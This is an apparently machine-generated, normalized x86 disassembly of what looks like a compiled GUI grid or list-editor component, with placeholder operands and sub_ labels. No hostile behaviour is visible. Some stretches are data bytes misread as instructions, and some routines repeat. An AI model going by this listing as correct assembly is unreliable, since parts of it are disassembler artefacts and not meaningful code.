add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc edx
fadd [ edi ]
and [ eax ] al
add [ eax ] al
push eax
pop ecx
inc ecx
add [ ebx + esi + 0x33c00040 ] dh
inc eax
add ah al
xor eax [ eax ]
enter 0x4033 0x0
jns r-xdata
add al [ eax ]
pop es
dec ebx
rcl [ ebp - 0x75 ] 0xec
push 0x0
push 0x0
push 0x0
push ebx
push esi
test dl dl
je r-xdata
cld
inc edi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x45080000 ] al
imul esi [ fs : ebp + ecx * 2 + 0x61 ] 0x28ec6b73
inc edi
add [ eax + eax ] cl
add bh bh
movsb [ edi ] [ esi ]
cld
inc edi
fadd [ edi ]
les ebx [ ecx + 0x41 ]
add [ esi ] al
add [ edi ] al
push esi
popad
insb
inc ebp
imul esi [ fs : esi + eax ] r-xdata
or [ eax ] al
add bh bh
mov ah bh
mov dl 0x1
mov eax [ r-xdata ]
call sub_40313c
mov esi eax
mov [ ebx + 0x2d8 ] esi
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405d94
mov edx [ ebp - 0x8 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x38 ]
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405d94
mov edx [ ebp - 0xc ]
mov eax [ ebx + 0x2d8 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx 0x2
mov eax ebx
call sub_4791d8
mov edx 0x2
mov eax ebx
call sub_479568
xor edx edx
mov eax ebx
call sub_47936c
mov edx 0x96
mov eax ebx
call sub_4792e0
mov edx 0x12
mov eax ebx
call sub_47931c
mov edx 0x132
mov eax ebx
call sub_43f36c
mov edx 0x12c
mov eax ebx
call sub_43f390
mov dx [ r-xdata ]
mov eax ebx
call sub_47f3e8
mov al [ r-xdata ]
mov [ ebx + 0x2e1 ] al
mov edx 0x1
mov eax ebx
call sub_4791c0
mov [ ebx + 0x2e4 ] 0x8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47de73
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_403f64
retn
mov [ ebp - 0x1 ] dl
mov ebx eax
xor eax eax
push ebp
push sub_47de6c
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax ebx
call sub_474a20
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_47f4bc
mov [ ebx + 0x2dc ] eax
add esp 0xfffffff0
call sub_403490
sub_47dd27
cmp al 0xfd
inc edi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x52080005 ] al
add al [ eax ]
pop es
dec ebx
jns r-xdata
rcl [ ebp - 0x75 ] 0xec
push 0x0
push 0x0
push 0x0
push ebx
push esi
test dl dl
je r-xdata
dec esp
outsb
je r-xdata
jae r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor eax eax
push ebp
push sub_47de6c
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax ebx
call sub_474a20
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_47f4bc
mov [ ebx + 0x2dc ] eax
add esp 0xfffffff0
call sub_403490
mov dl 0x1
mov eax [ r-xdata ]
call sub_40313c
mov esi eax
mov [ ebx + 0x2d8 ] esi
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405d94
mov edx [ ebp - 0x8 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x38 ]
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405d94
mov edx [ ebp - 0xc ]
mov eax [ ebx + 0x2d8 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx 0x2
mov eax ebx
call sub_4791d8
mov edx 0x2
mov eax ebx
call sub_479568
xor edx edx
mov eax ebx
call sub_47936c
mov edx 0x96
mov eax ebx
call sub_4792e0
mov edx 0x12
mov eax ebx
call sub_47931c
mov edx 0x132
mov eax ebx
call sub_43f36c
mov edx 0x12c
mov eax ebx
call sub_43f390
mov dx [ r-xdata ]
mov eax ebx
call sub_47f3e8
mov al [ r-xdata ]
mov [ ebx + 0x2e1 ] al
mov edx 0x1
mov eax ebx
call sub_4791c0
mov [ ebx + 0x2e4 ] 0x8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47de73
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_403f64
retn
fadd [ edx ]
add [ eax ] al
add [ eax ] dl
inc eax
add [ eax ] bl
add [ eax ] al
popad
dec edi
outsb
insb
jns r-xdata
pop esp
pop esi
inc ecx
add al dh
cld
inc edi
add [ edi * 8 + 0x10047 ] bl
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add eax [ eax ]
or [ eax + 0x69 ] dl
arpl [ ebx + 0x4c ] bp
imul esi [ ebx + 0x74 ] r-xdata
adc al 0x0
add bh bh
sub_47de96
add [ eax ] al
pop es
add [ eax ] al
add [ ebx + 0x56 ] dl
call sub_4034f8
mov ebx edx
mov esi eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_474b70
mov eax [ esi + 0x2d8 ]
call sub_40316c
mov eax [ esi + 0x2dc ]
call sub_40316c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034e0
sub_47ded8
push ebx
push esi
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_47a548
mov esi eax
mov [ ebx + 0x2f8 ] esi
mov eax [ ebx + 0x2e4 ]
mov [ esi + 0x258 ] eax
mov eax [ ebx + 0x308 ]
mov [ esi + 0x268 ] eax
mov eax [ ebx + 0x30c ]
mov [ esi + 0x26c ] eax
mov [ esi + 0x264 ] ebx
mov [ esi + 0x260 ] sub_47ebdc
mov eax esi
pop esi
pop ebx
retn
sub_47df2c
push ebx
push esi
push edi
add esp 0xfffffff0
mov edi ecx
mov esi edx
mov ebx eax
push edi
mov [ esp + 0x4 ] ebx
mov [ esp + 0x8 ] 0xb
mov [ esp + 0xc ] esi
mov [ esp + 0x10 ] 0xb
lea edx [ esp + 0x4 ]
mov ecx 0x1
mov eax r-xdata
call sub_409118
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_47df78
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_47e00b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_47e2bc
mov edx [ eax ]
call [ edx + 0x14 ]
mov edx [ ebx + 0x22c ]
sub edx [ ebx + 0x23c ]
cmp eax edx
jle r-xdata
xor eax eax
jmp r-xdata
lea eax [ ebp - 0x4 ]
push eax
mov ecx [ ebx + 0x22c ]
xor edx edx
mov eax ebx
mov esi [ eax ]
call [ esi + 0xf4 ]
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47e012
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f64
retn
lea eax [ ebp - 0x8 ]
push eax
mov ecx [ ebx + 0x22c ]
mov edx 0x1
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0xf4 ]
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov al 0x1
sub_47e024
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
test esi esi
jne r-xdata
mov eax ebx
call sub_47e2bc
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jne r-xdata
test [ ebx + 0x2e1 ] 0x1
je r-xdata
sub esi [ ebx + 0x23c ]
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
call sub_403f40
jmp r-xdata
mov eax [ ebx + 0x2d8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp eax [ ebp - 0x4 ]
jle r-xdata
mov eax ebx
call sub_47e2bc
mov ecx [ ebp + 0x8 ]
mov edx esi
mov ebx [ eax ]
call [ ebx + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx ]
mov eax r-xdata
call sub_404544
test eax eax
jle r-xdata
mov eax ebx
call sub_47e2bc
mov ecx [ ebp + 0x8 ]
mov edx esi
call sub_41946c
jmp r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
mov eax [ ebp + 0x8 ]
call sub_403f40
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x2d8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov ecx eax
mov eax 0x1
xchg edx eax
call sub_4044a0
sub_47e0e3
inc [ ecx ]
add [ eax ] al
add [ 0x55000000 ] bh
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_47e1b5
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi [ ebp - 0x8 ]
sub esi [ ebx + 0x23c ]
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
lea eax [ ebp - 0x14 ]
push eax
mov ecx [ ebp - 0x8 ]
xor edx edx
mov eax ebx
mov edi [ eax ]
call [ edi + 0xf4 ]
mov eax [ ebp - 0x14 ]
lea ecx [ ebp - 0xc ]
mov edx [ ebp + 0x8 ]
call sub_47df2c
lea eax [ ebp - 0x10 ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx 0x1
mov eax ebx
mov edi [ eax ]
call [ edi + 0xf4 ]
mov edx [ ebp - 0x10 ]
lea ecx [ ebp - 0xc ]
mov eax [ ebp + 0x8 ]
call sub_47df2c
jmp r-xdata
mov eax ebx
call sub_47e2bc
mov ecx [ ebp - 0xc ]
mov edx esi
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov eax ebx
call sub_47e2bc
mov edx [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
jmp r-xdata
mov eax ebx
call sub_47e2bc
mov edx [ eax ]
call [ edx + 0x14 ]
cmp esi eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47e1bc
lea eax [ ebp - 0x14 ]
mov edx 0x3
call sub_403f64
retn
sub_47e1e0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push edi
mov ecx esi
xor edx edx
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0xf4 ]
pop edi
pop esi
pop ebx
retn
sub_47e214
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_47e2a0
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x2d8 ]
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405d94
push [ ebp - 0xc ]
push r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405d94
push [ ebp - 0x10 ]
push r-xdata
lea eax [ ebp - 0x8 ]
mov edx 0x4
call sub_4042c0
mov edx [ ebp - 0x8 ]
pop eax
call sub_40434c
setne al
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47e2a7
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_403f64
retn
sub_47e2d0
push ebp
mov ebp esp
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
xor edx edx
call sub_479404
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_47e01c
cmp eax 0x2
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx 0x1
call sub_479404
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx 0x2
call sub_479568
sub_47e318
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
test [ ebp - 0x5 ] 0x1
setne al
mov edx [ ebp - 0x4 ]
test [ edx + 0x2e1 ] 0x1
setne dl
cmp al dl
je r-xdata
mov eax [ ebp - 0x4 ]
mov dl [ ebp - 0x5 ]
mov [ eax + 0x2e1 ] dl
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xe8 ]
mov eax [ ebp - 0x4 ]
call sub_47e768
pop ecx
pop ecx
pop ebp
retn
push ebp
test [ ebp - 0x5 ] 0x1
setne dl
call sub_47e2d0
pop ecx
sub_47e370
push ebx
push ecx
mov [ esp ] dl
mov ebx eax
test [ esp ] 0x1
jne r-xdata
test [ esp ] 0x2
je r-xdata
test [ ebx + 0x2e0 ] 0x1
je r-xdata
test [ esp ] 0x1
jne r-xdata
test [ ebx + 0x2e0 ] 0x2
jne r-xdata
mov al [ r-xdata ]
not eax
and al [ esp ]
mov [ esp ] al
mov al [ esp ]
mov [ ebx + 0x2e0 ] al
pop edx
pop ebx
retn
cmp [ ebx + 0x228 ] 0x0
jne r-xdata
mov al [ r-xdata ]
or al [ esp ]
mov [ esp ] al
mov edx 0x1
mov eax ebx
call sub_4791c0
sub_47e43c
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov [ eax + 0x308 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x30c ] edx
mov edx [ eax + 0x2f8 ]
test edx edx
je r-xdata
pop ebp
retn 0x8
mov ecx [ eax + 0x308 ]
mov [ edx + 0x268 ] ecx
mov ecx [ eax + 0x30c ]
mov [ edx + 0x26c ] ecx
sub_47e478
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x8 ] ebx
mov esi [ ebp + 0xc ]
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_47e572
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x28c ] 0x0
je r-xdata
lea eax [ ebp - 0x18 ]
push eax
mov al [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_47a144
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47e579
lea eax [ ebp - 0x28 ]
call sub_40f0a8
lea eax [ ebp - 0x8 ]
call sub_403f40
retn
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
xor edi edi
mov eax [ ebx + 0x23c ]
dec eax
cmp esi eax
jle r-xdata
lea eax [ ebp - 0x8 ]
push eax
mov ecx esi
mov edx [ ebp - 0x4 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0xf4 ]
cmp [ edi + 0x1c ] 0x0
je r-xdata
lea eax [ ebp - 0x28 ]
mov edx esi
sub edx [ ebx + 0x23c ]
mov cl 0xfc
call sub_4131fc
lea edx [ ebp - 0x28 ]
xor ecx ecx
mov eax [ ebx + 0x2dc ]
call sub_47f974
mov edi eax
jmp r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ edi + 0x1c ]
call sub_403fd8
jmp r-xdata
test edi edi
je r-xdata
mov eax [ ebp - 0x14 ]
add eax 0x2
push eax
mov eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp - 0x18 ]
add ecx 0x2
lea edx [ ebp - 0x18 ]
mov eax [ ebx + 0x208 ]
call sub_422748
sub_47e584
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2ed ] 0x0
jne r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_446754
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x2e1 ] 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x2ed ] 0x1
xor eax eax
push ebp
push sub_47e6b2
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_4790fc
mov ebx eax
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_4790fc
add ebx eax
mov eax [ ebp - 0x4 ]
call sub_43f5b4
sub eax 0x2
cmp ebx eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x2ed ] 0x0
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x2e1 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_43f5b4
mov ecx eax
sub ecx 0x2
sar ecx 0x1
jns r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_4790fc
push eax
mov eax [ ebp - 0x4 ]
call sub_43f5b4
mov ecx eax
pop eax
sub ecx eax
sub ecx 0x2
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_479234
jmp r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_479234
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_4790fc
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_43f5b4
sub eax 0x2
and eax 0x80000001
jns r-xdata
adc ecx 0x0
add ebx eax
mov ecx ebx
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_479234
dec eax
or eax 0xfffffffe
inc eax
sub_47e6c0
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_47e2bc
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
mov esi [ ebx + 0x23c ]
inc esi
mov eax ebx
call sub_47e2bc
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
add esi [ ebx + 0x23c ]
jmp r-xdata
pop esi
pop ebx
retn
cmp esi [ ebx + 0x22c ]
jge r-xdata
mov eax ebx
call sub_47e01c
cmp esi eax
je r-xdata
test [ ebx + 0x2e1 ] 0x1
je r-xdata
mov edx esi
dec edx
mov eax ebx
call sub_479550
mov edx esi
mov eax ebx
call sub_479568
cmp [ ebx + 0x22c ] 0x0
jne r-xdata
mov edx 0x1
mov eax ebx
call sub_479550
sub_47e768
push ebx
mov ebx eax
cmp [ ebx + 0x2f0 ] 0x0
jne r-xdata
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xec ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax ebx
call sub_475000
sub_47e798
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
mov esi eax
xor eax eax
push ebp
push sub_47e806
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_474ec4
mov ebx eax
test bl bl
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47e80d
lea eax [ ebp - 0x10 ]
call sub_40f0a8
retn
lea eax [ ebp - 0x10 ]
mov edx [ esi + 0x22c ]
sub edx [ esi + 0x23c ]
mov cl 0xfc
call sub_4131fc
lea edx [ ebp - 0x10 ]
xor ecx ecx
mov eax [ esi + 0x2dc ]
call sub_47f974
test eax eax
je r-xdata
mov bl [ eax + 0x18 ]
xor bl 0x1
sub_47e840
push ebx
mov ebx eax
dec [ ebx + 0x2f0 ]
cmp [ ebx + 0x2f0 ] 0x0
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_47e2bc
mov edx [ eax ]
call [ edx + 0x14 ]
cmp eax [ ebx + 0x2f4 ]
je r-xdata
mov eax ebx
call sub_47e768
sub_47e870
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
mov ebx eax
xor eax eax
push ebp
push j_sub_4038c0#9
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x10 ]
mov edx [ ebx + 0x22c ]
sub edx [ ebx + 0x23c ]
mov cl 0xfc
call sub_4131fc
lea edx [ ebp - 0x10 ]
xor ecx ecx
mov eax [ ebx + 0x2dc ]
call sub_47f974
test eax eax
je r-xdata
mov eax ebx
call sub_474fa0
mov ebx eax
mov ebx [ eax + 0x14 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47e8df
lea eax [ ebp - 0x10 ]
call sub_40f0a8
retn
sub_47e8e8
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov edi [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_47e988
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x18 ]
mov edx [ ebx + 0x22c ]
sub edx [ ebx + 0x23c ]
mov cl 0xfc
call sub_4131fc
lea edx [ ebp - 0x18 ]
xor ecx ecx
mov eax [ ebx + 0x2dc ]
call sub_47f974
mov esi eax
test esi esi
je r-xdata
mov eax edi
call sub_403f40
mov eax edi
mov edx [ esi + 0x8 ]
call sub_403f94
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47e98f
lea eax [ ebp - 0x18 ]
call sub_40f0a8
retn
mov eax [ ebp - 0x8 ]
push eax
push edi
mov ecx [ ebp - 0x4 ]
mov edx ebx
mov eax [ ebx + 0x2ac ]
call [ ebx + 0x2a8 ]
cmp [ ebx + 0x2aa ] 0x0
je r-xdata
sub_47e998
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_47ea2d
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47ea34
lea eax [ ebp - 0x14 ]
call sub_40f0a8
retn
lea eax [ ebp - 0x14 ]
mov edx [ esi + 0x22c ]
sub edx [ esi + 0x23c ]
mov cl 0xfc
call sub_4131fc
lea edx [ ebp - 0x14 ]
xor ecx ecx
mov eax [ esi + 0x2dc ]
call sub_47f974
test eax eax
je r-xdata
mov eax [ esi + 0x2f8 ]
call sub_47a8e8
mov edx [ eax + 0x218 ]
mov cl 0x1
mov eax esi
call sub_47ec8c
test al al
je r-xdata
cmp [ eax + 0xc ] 0x0
je r-xdata
mov bl 0x2
mov bl [ eax + 0xc ]
jmp r-xdata
sub_47ea3c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
mov edi [ eax ]
call [ edi + 0xf4 ]
cmp [ ebx + 0x2b2 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x2b4 ]
call [ ebx + 0x2b0 ]
sub_47ea88
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov edi ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov esi [ ebp + 0x8 ]
xor eax eax
push ebp
push j_sub_4038c0#8
push [ fs : eax ]
mov [ fs : eax ] esp
push esi
mov ecx edi
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_47a118
mov eax [ ebp - 0x4 ]
call sub_47e818
xor eax eax
push ebp
push sub_47ebac
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_47e2bc
mov edx [ eax ]
call [ edx + 0x14 ]
mov edx [ ebp - 0x4 ]
mov ecx edi
sub ecx [ edx + 0x23c ]
cmp eax ecx
jg r-xdata
lea eax [ ebp - 0xc ]
push eax
mov ecx edi
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xf4 ]
mov edx [ ebp - 0xc ]
mov eax esi
call sub_40434c
je r-xdata
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47ebb3
mov eax [ ebp - 0x4 ]
call sub_47e840
retn
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_47e2bc
xor edx edx
call sub_418f9c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2dc ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x2f4 ] eax
mov eax [ ebp - 0x4 ]
add eax 0x2e8
call sub_403f40
push esi
mov ecx edi
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xf8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2dc ]
xor ecx ecx
mov edx esi
call sub_47f67c
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2e8 ]
mov edx esi
call sub_40434c
je r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x2e8
mov edx esi
call sub_403f94
jmp r-xdata
sub_47ebdc
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov esi eax
mov edi [ ebp + 0x8 ]
xor eax eax
push ebp
push j_sub_4038c0#7
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47ec80
lea eax [ ebp - 0x14 ]
call sub_40f0a8
retn
lea eax [ ebp - 0x14 ]
mov edx [ esi + 0x22c ]
sub edx [ esi + 0x23c ]
mov cl 0xfc
call sub_4131fc
lea edx [ ebp - 0x14 ]
xor ecx ecx
mov eax [ esi + 0x2dc ]
call sub_47f974
mov ebx eax
test ebx ebx
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x44 ]
mov eax ebx
call sub_47fcd0
test al al
je r-xdata
mov eax ebx
call sub_47fcf0
mov edx eax
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x8 ]
jmp r-xdata
xor ecx ecx
mov edx edi
mov eax esi
call sub_47ec8c
sub_47ec8c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
mov ebx ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_47ed79
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ esi + 0x302 ] 0x0
je r-xdata
mov [ ebp - 0x5 ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47ed80
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_403f64
retn
lea ecx [ ebp - 0xc ]
mov edx [ esi + 0x22c ]
mov eax esi
call sub_47e1e0
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4190f4
xor eax eax
push ebp
push j_sub_4038c0#6
push [ fs : eax ]
mov [ fs : eax ] esp
test bl bl
je r-xdata
mov eax [ ebp - 0x4 ]
push eax
lea ecx [ ebp - 0x10 ]
mov edx [ esi + 0x22c ]
mov eax esi
call sub_47e1e0
mov ecx [ ebp - 0x10 ]
mov edx esi
mov eax [ esi + 0x304 ]
call [ esi + 0x300 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
setg [ ebp - 0x5 ]
mov eax [ esi + 0x2f8 ]
mov dl [ ebp - 0x5 ]
mov [ eax + 0x25f ] dl
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_4191b0
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x44 ]
sub_47ed8c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_47eebc
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x22c ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
call sub_47e2bc
mov edx [ eax ]
call [ edx + 0x14 ]
cmp eax [ ebp - 0x8 ]
jl r-xdata
mov eax [ ebp - 0x4 ]
call sub_47e2bc
call sub_4190f4
xor eax eax
push ebp
push sub_47ee75
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_47df78
test al al
jne r-xdata
lea ecx [ ebp - 0x10 ]
mov edx edi
mov eax esi
call sub_47df2c
mov eax [ ebp - 0x10 ]
